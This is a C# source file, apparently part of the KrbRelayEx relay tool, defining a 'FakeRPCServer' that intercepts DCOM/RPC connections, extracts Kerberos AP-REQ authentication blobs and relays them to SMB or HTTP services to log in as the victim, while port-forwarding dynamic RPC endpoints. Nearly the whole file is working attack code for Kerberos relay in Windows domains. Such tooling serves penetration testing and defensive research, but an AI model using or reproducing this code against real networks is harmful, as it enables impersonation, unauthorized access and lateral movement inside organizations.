using KrbRelay;
using KrbRelay.Clients;
using KrbRelay.Clients.Attacks.Ldap;
using SMBLibrary;
using SMBLibrary.Client;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;


using KrbRelayEx.Misc;
using System.ComponentModel;
using DSInternals.Common;
using System.Collections;
using System.Threading;
using Org.BouncyCastle.Asn1.Ocsp;
using SMBLibrary.Services;
/// <summary>



public class FakeRPCServer
{
    private Socket _listenerSocket;
    private IPEndPoint _targetEndpoint;
    private ConcurrentDictionary<string, State> _activeConnections = new ConcurrentDictionary<string, State>();

    private int _listenPort;
    private string _targetHost;
    private int _targetPort;
    private bool _isRunning = false;
    public bool ForwardOnly = false;
    public string ServerType = "";
    public byte[] CallID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
    public int Opnum;
    public State state;
    public bool alreadystarted = false;
    public const int PACKET_TYPE_REQUEST = 0;
    public const int PACKET_TYPE_RESPONSE = 2;
    public const int OPNUM_REMOTE_CREATE_INSTANCE = 4;
    public int ISystemActivatorOffset = -1;
    public int IOXidResolverOffset = -1;
    public int EPMOffset = -1;
    public byte[] AssocGroup = new byte[4];
    public byte[] ServerAliveResp = new byte[]
    {
        0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x02, 0x00, 0x33, 0x00, 0x00, 0x00, 0x33, 0x00, 0x1D, 0x00, 0x07, 0x00,
        0x41, 0x00, 0x44, 0x00, 0x43, 0x00, 0x53, 0x00, 0x2D, 0x00, 0x4D, 0x00, 0x59, 0x00, 0x4C, 0x00, 0x41, 0x00, 0x42, 0x00, 0x00,
        0x00, 0x07, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00, 0x38, 0x00, 0x2E, 0x00, 0x32, 0x00,
        0x31, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x34, 0x00, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x1E,
        0x00, 0xFF, 0xFF, 0x00, 0x00, 0x10, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x16, 0x00, 0xFF, 0xFF,
        0x00, 0x00, 0x1F, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x0E, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00
    };

    public FakeRPCServer(int listenPort, string targetHost, int targetPort)
    {
        
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;

    }
    public FakeRPCServer(int listenPort, string targetHost, int targetPort, string stype)
    {
        
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;
        ServerType = stype;

    }
    public void Start(bool fwd)
    {
        Console.WriteLine("[*] Starting FakeRPCServer on port:{0}", _listenPort);
        _listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, _listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        IPAddress.TryParse(Program.RedirectHost, out IPAddress ipAddress);
        _targetEndpoint = new IPEndPoint(ipAddress, _targetPort);
        _isRunning = true;
        _listenerSocket.BeginAccept(OnClientConnect, null);

        ForwardOnly = fwd;

    }
    public void Stop()
    {
        if (_isRunning)
        {
        
            _isRunning = false;

        
            _listenerSocket.Close();

        
            foreach (var kvp in _activeConnections)
            {
                CloseConnection(kvp.Value);
            }

            _activeConnections.Clear();

        
        }
    }

    public void ListConnectedClients()
    {
        Console.WriteLine("\n[*] Connected Clients on port:{0}", _listenPort);
        foreach (var key in _activeConnections.Keys)
        {
            Console.WriteLine($"- {key}");
        }
    }

    private void OnClientConnect(IAsyncResult ar)
    {
        try
        {
            
            Socket clientSocket = _listenerSocket.EndAccept(ar);

            _listenerSocket.BeginAccept(OnClientConnect, null);
        
            string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";

            Console.WriteLine($"[*] FakeRPCServer[{_listenPort}]: Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode", _listenPort);

        
            Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            targetSocket.Connect(_targetEndpoint);

        
            var clientToTargetState = new State(clientSocket, targetSocket);
            var targetToClientState = new State(targetSocket, clientSocket);

        
            _activeConnections[clientKey] = clientToTargetState;

        
            clientSocket.BeginReceive(clientToTargetState.Buffer, 0, clientToTargetState.Buffer.Length, SocketFlags.None, OnDataFromClient, clientToTargetState);
            targetSocket.BeginReceive(targetToClientState.Buffer, 0, targetToClientState.Buffer.Length, SocketFlags.None, OnDataFromTarget, targetToClientState);



        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error accepting client: {ex.Message}");
        }
    }
    private void OnDataFromClient(IAsyncResult ar)
    {
        state = (State)ar.AsyncState;
        byte[] buffer = new byte[4096];
        
        
        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);
            int l = 0;

            if (bytesRead > 0)
            {

                state.numReads++;
                byte[] b = new byte[2];
                b[0] = state.Buffer[22];
                b[1] = state.Buffer[23];

                int tmpopnum = BitConverter.ToInt16(b);
                if (tmpopnum == 3)
                    Opnum = 3;
                
                {
                    
                    


                    if (state.Buffer[2] == PACKET_TYPE_REQUEST)
                    {
                        CallID[0] = state.Buffer[12];
                        
                    }
                
                }

                byte[] assoc = new byte[4];
                Array.Copy(state.Buffer, 20, assoc, 0, 4);
                if (!Array.TrueForAll(assoc, b => b == 0))
                {
                    Array.Copy(state.Buffer, 20, Program.AssocGroup, 0, 4);
                    Array.Copy(state.Buffer, 20, AssocGroup, 0, 4);
                }

                
                int ticketOffset = Program.FindGssApiBlob(state.Buffer);
                
                if (ticketOffset > 0 && !Program.forwdardmode )
                {

                    
                    ISystemActivatorOffset = Helpers.PatternAt(state.Buffer, new byte[] { 0x01, 0x00, 0x01, 0x00, 0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }); //ISystemActivatorUUID
                    IOXidResolverOffset = Helpers.PatternAt(state.Buffer, new byte[] { 0xC4, 0xFE, 0xFC, 0x99, 0x60, 0x52, 0x1B, 0x10, 0xBB, 0xCB, 0x00, 0xAA, 0x00, 0x21, 0x34, 0x7A, 0x00, 0x00, 0x00, 0x00 });

                  
                    buffer = state.Buffer.Skip(ticketOffset).ToArray();

                    Program.apreqBuffer = new byte[buffer.Length];

                   

                    Array.Copy(buffer, Program.apreqBuffer, bytesRead);
                    Program.CallID[0] = state.Buffer[12];
                    CallID[0] = state.Buffer[12];
                   

                    if (Program.service=="cifs"  && ISystemActivatorOffset>-1)
                    {

                        if (!Program.bgconsole)
                        {
                            SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                            KrbRelay.Clients.Smb smb2 = new Smb();
                            smbc.currSourceSocket = state.SourceSocket;
                            smbc.currDestSocket = state.TargetSocket;
                            smbc.ServerType = ServerType;
                            smbc.CallID = CallID;
                            smbc.AssocGroup = AssocGroup;
                           

                            smbc.currSocketServer = this;
                            bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                            if (!isConnected)
                            {
                                Console.WriteLine("[-] Could not connect to {0}:445", Program.targetFQDN);

                            }


                            state.isRelayed = true;
                            Console.WriteLine("[*] SMB relay [{0}] Connected to: {1}:445", state.SourceSocket.RemoteEndPoint,Program.targetFQDN);
                            
                            smb2.alreadyLoggedIn = false;
                            Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));
                            //smb2.smbConnect(smbc, Program.apreqBuffer);
                           
                            while (state.isRelayed)
                                Thread.Sleep(100);
                           
                            CloseConnection(state);
                            Program.forwdardmode = true;
                            return;
                        }
                        else
                        {

                            
                            SMBCommandSocketConsole smbs = new SMBCommandSocketConsole();
                            smbs.currSocketServer = this;
                            Console.WriteLine("[*] SMB relay [{0}] socket console Connected to: [{1}:445]", state.SourceSocket.RemoteEndPoint, Program.targetFQDN);
                            state.isRelayed = true;
                            
                            Task.Run(() => smbs.Start(Program.bgconsoleStartPort++, state, Program.apreqBuffer));
                            
                            while (state.isRelayed)
                                Thread.Sleep(100);
                            
                            
                            CloseConnection(state);
                            
                            return;
                        }
                          
                    
                    }
                    if (Program.service == "http" )
                    {
                        
                        
                        Program.currDestSocket = state.TargetSocket;
                        Program.currSourceSocket = state.SourceSocket;
                        Program.currSocketServer = this;
                        Http.Connect();
                       
                        return;
                    }

                }
                if (!state.isRelayed)
                {
                    state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                    // Continue receiving data from the client


                    // Continue receiving data from the client
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                    //bytesRead = state.SourceSocket.Receive(state.Buffer);


                }

            }
        }

        catch (Exception ex)
        {
            //Console.WriteLine($"Error1 forwarding data from client: {ex.Message}");
            //if (!state.isRelayed)
            CloseConnection(state);
        }
    }




    private void OnDataFromTarget(IAsyncResult ar)
    {
        var state = (State)ar.AsyncState;

        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);

            if (bytesRead > 0)
            {
                // Forward data to the client

                state.numReads++;
                byte[] b = new byte[2];
                b[0] = state.Buffer[22];
                b[1] = state.Buffer[23];


                int Opnum = BitConverter.ToInt16(b);
                //Console.WriteLine("[*] Type {0}  Opnum :{1} CallId {2}", state.Buffer[2], Opnum, CallID[0]);
                int epmoffset = Helpers.PatternAt(state.Buffer, new byte[] { 0x13, 0x00, 0x0D, 0xF7, 0xAF, 0xBE, 0xF6, 0x19, 0x1E, 0xBB, 0x4F, 0x9F, 0x8F, 0xB8, 0x9E, 0x20, 0x18, 0x33, 0x7C, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00 });
                
                if (state.Buffer[2] == PACKET_TYPE_RESPONSE && state.Buffer[12] == CallID[0] && _listenPort == Program.RPCListnerPort)
                {
                    string securityBinding = Encoding.Unicode.GetString(state.Buffer).TrimEnd('\0');
                    
                    string port = Program.ExtractPortFromBinding(securityBinding);
                    if (port != null)
                    {
                        //Console.WriteLine($"[*] Extracted Port: {port}");
                        int p = int.Parse(port);
                        if (true /*!alreadystarted*/)
                        {
                                PortForwarder RPCtcpFwd = new PortForwarder(p, Program.RedirectHost, p);
                            RPCtcpFwd.StartAsync();
                               // RPCtcpFwd.Start(true);
                            alreadystarted = true;
                        }


                    }
                    else if (epmoffset > -1)//EPMAP
                    {
                        b[0] = state.Buffer[bytesRead - 16];
                        b[1] = state.Buffer[bytesRead - 15];
                        int p = (b[0] << 8) | b[1];
                        
                        
                        if (p >0)
                        {
                            if(false /*!Program.forwdardmode*/)
                            {
                                Console.WriteLine("[-] FakeRPCServer {0} Port not found in the binding string maybe {1:X}{2:X} {3} {4} starting a new one ",_listenPort, b[0], b[1], p, state.Buffer.Length);
                                FakeRPCServer RPCtcpFwd = new FakeRPCServer(p, Program.RedirectHost, p, "RPC");
                                //Task.Run(() => RPCtcpFwd.Start(false));
                            
                                Task.Run(() => RPCtcpFwd.Start(false));
                                alreadystarted = true;
                            }
                            else 
                            {

                                //Console.WriteLine("[-] FakeRPCServer {0} Port Foreader not found in the binding string maybe {1:X}{2:X} {3} {4}", _listenPort, b[0], b[1], p, state.Buffer.Length);
                                
                                PortForwarder RPCtcpFwd = new PortForwarder(p, Program.RedirectHost, p);
                                RPCtcpFwd.StartAsync();

                            }

                        }
                        
                        
                    }
                    //CloseConnection(state);

                }
                state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);
             
                // Continue receiving data from the target
                state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromTarget, state);
            }
            else
            {
                // Target server disconnected
                CloseConnection(state);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error forwarding data from target: {ex.Message}");
            CloseConnection(state);
        }
    }


    public void CloseConnection(State state)
    {
        try
        {
            string clientEndpoint = state.SourceSocket.RemoteEndPoint.ToString();
            //Console.WriteLine($"[*] Redirector: Closing connection for {clientEndpoint}");

            state.SourceSocket?.Close();
            state.TargetSocket?.Close();

            // Remove the connection from the dictionary
            string keyToRemove = null;
            foreach (var kvp in _activeConnections)
            {
                if (kvp.Value == state)
                {
                    keyToRemove = kvp.Key;
                    break;
                }
            }

            if (keyToRemove != null)
            {
                _activeConnections.TryRemove(keyToRemove, out _);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error closing connection: {ex.Message}");
        }
    }

}


////////////////////
